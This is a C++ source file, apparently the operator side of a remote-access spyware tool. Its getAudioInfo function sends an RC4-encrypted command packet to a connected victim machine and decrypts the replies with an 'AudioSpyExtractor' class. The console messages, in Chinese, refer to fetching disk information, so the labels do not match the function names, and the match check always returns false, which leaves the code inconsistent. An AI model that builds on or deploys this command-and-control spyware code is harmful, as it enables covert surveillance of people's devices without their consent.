#include "AudioSpyExtractor.h"
#include "utils.h"
#include "rc4crpt.h"
#include <iostream>

#define LEN_DATA 22

using namespace std;
SOCKET getAudioInfo(SOCKET clientSocket, SOCKET serverSocket)
{
    char msg[8192];//存储传送的消息
    sockaddr_in client_sin;
    int len = sizeof(client_sin);

    cout << "您选择的是获取磁盘信息功能" << endl;
    char keyAry[256];
    string data = { 0x4B,0x75,0x47,0x6F,0x75,LEN_DATA,0x00,0x00,0x00,LEN_DATA,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x03,0x1C,0x00,0x00 };

    rc4_init(keyAry, (char*)RC4_KEY, strlen(RC4_KEY));
    rc4_cryp(keyAry, (char*)data.c_str(), LEN_DATA);
    //getline(cin, data);
    const char* sendData;
    sendData = data.c_str();
    cout << "发送指令中" << endl;
    send(clientSocket, sendData, LEN_DATA, 0);

    clientSocket = accept(serverSocket, (sockaddr*)&client_sin, &len);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Accept error" << endl;

        return 0;
    }

    while (true) {
        AudioSpyExtractor extractor;
        int num = recv(clientSocket, msg, 8192, 0);
        if (num == 0) break;
        extractor.decryptData(msg, num);
        int ret = extractor.parse_data();
        std::cout << "客户端说" << extractor.parsedData.getAddressOfIndex(0) << endl;
        if (ret && extractor.isMatch()) {
            std::cout << "获取磁盘信息成功" << endl;
      /*      diskinfo* info = extractor.getDiskInfo();

            for (int i = 0; i < extractor.diskCount; i++) {
                std::cout << info[i].lpRootPathName << "  " << (int)info[i].driveType << "  " << info[i].totalMBs << "  " << info[i].FreeMBs << "  " << info[i].typeName << "  " << info[i].szFileSystemName << std::endl;
            }
            break;*/
            
        }
    }

    return SOCKET();
}

bool AudioSpyExtractor::isMatch()
{
    return false;
}
